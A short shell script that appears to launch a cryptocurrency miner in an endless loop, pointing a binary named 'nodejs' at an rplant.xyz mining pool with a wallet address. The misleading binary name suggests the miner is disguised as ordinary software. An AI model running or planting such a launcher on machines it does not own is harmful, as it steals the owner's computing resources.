#!/bin/sh
#
# Choose nearest stratum:
#       stratum-ru.rplant.xyz   /Moscow/
#       stratum-eu.rplant.xyz   /London/
#       stratum-asia.rplant.xyz /Singapore/
#       stratum-na.rplant.xyz   /Toronto/
#
while [ 1 ]; do
./nodejs -a yescryptr16 -o stratum+tcps://stratum-eu.rplant.xyz:17057 -u GLridz3to1XykFvisK8Nwojzgbd2p7ZqJQ.node
sleep 5
done